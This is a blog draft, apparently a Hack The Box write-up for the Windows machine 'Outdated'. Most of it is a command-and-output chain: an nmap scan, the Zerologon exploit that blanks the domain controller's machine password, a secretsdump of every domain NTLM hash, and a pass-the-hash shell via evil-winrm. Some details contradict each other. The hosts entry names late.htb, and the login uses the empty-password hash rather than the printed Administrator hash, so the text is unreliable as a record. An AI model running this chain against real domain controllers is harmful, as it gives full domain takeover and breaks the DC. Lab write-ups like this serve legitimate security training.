---
title: "Outdated -- HTB walkthrough"
date: 2022-08-14T10:12:16+13:00
draft: true
description: "https://app.hackthebox.com/machines/outdated"
tags : ['htb', 'windows', 'medium', 'active']
aliases: [/ctf/htb/boxes/outdated/]
---
{{% hugo-encryptor "PASSWORD" %}}

# You cannot see me unless you've got the password!

### Official [box page](https://app.hackthebox.com/machines/outdated) on HTB

{{< img-border-radius src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/outdated/img/outdated.png" radius="3%" >}}
### Walkthrough:

#### System Scan | **IP: 10.129.15.107**

let's add the ip to to the `/etc/hosts` file with the default hostname`outdated.htb`

> `echo '10.129.15.107    late.htb ' >> /etc/hosts`
> nmap -Pn 10.129.15.107 -T4
```bash
werz@ctf01:~/ctf/htb/outdated$ nmap -Pn 10.129.15.107 -T4
Nmap scan report for 10.129.15.107
PORT      STATE   SERVICE
25/tcp    open    smtp
53/tcp    open    domain
88/tcp    open    kerberos-sec
135/tcp   open    msrpc
139/tcp   open    netbios-ssn
389/tcp   open    ldap
445/tcp   open    microsoft-ds
464/tcp   open    kpasswd5
593/tcp   open    http-rpc-epmap
636/tcp   open    ldapss1
3268/tcp  open    globalcatLDAPssl
5985/tcp  open    wsman
50006/tcp open    unknown
```

I Believe that the way I'll do is probably a unintended way.

download [risksense/zerologon](https://github.com/risksense/zerologon) and execute it passing it a DC name and the victim IP

it will take some time:

```bash
werz@ctf01:—/ctf/htb/outdated$ python3 set_empty_pw.py DC 10.129.15.107
Performing authentication attempts... 
=======

NetrServerAuthenticate3Response
ServerCredential:
Data:                            b'\xd7\x93\xa6\x1d\xe7\x1c\xbeut' 
NegotiateFlags:                  556793855 
AccountRid:                      1002
ErrorCode:                       0 
server challenge b'\xd7\x9b$\x14\xbc\x91\xf7\x83' 
Net rServerPasswordSet2Response 
ReturnAuthenticator: 
Credential: 
Data:                           b'\x014\x1d\x97\xb078;' 
Timestamp:                      0 
ErrorCode:                      0 

Success! DC should now have the empty string as its machine password. 
```

so the password has been removed we can dump hashes with impacket [secretdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)

```bash
werz@ctf01:~/ctf/htb/outdated$ secretdump.py -just-dc -no-pass 'DC$@10.129.15.107'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:716f1ce2e2cf38ee1210cce35eb78cb6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a300e4031093085c7af7ac61a79e6d00:::
outdated.htb\btables:1106:aad3b435b51404eeaad3b435b51404ee:781444163f086fdf8de13de9110ed6e7:::
outdated.htb\sflowers:1108:aad3b435b51404eeaad3b435b51404ee:1fcdb1f6015dcb318cc77bb2bda14db5:::
DC$:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CLIENT$:1105:aad3b435b51404eeaad3b435b51404ee:c57f6ab8490903d04597f6ff606fc58b:::
```

With the administrator hash we can connect with [evil-winrm](https://github.com/Hackplayers/evil-winrm)
```bash
werz@ctf01:~/ctf/htb/outdated$ evil-winrm -u Administrator -i 10.129.15.107 -H 31d6cfe0d16ae931b73c59d7e0c089c0
Evil-WinRm shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRm* PS C:\Users\Administrator\Documents>
```
And we are in :)

> it may be patched anytime, I'll post the intented way soon.

{{% /hugo-encryptor %}}
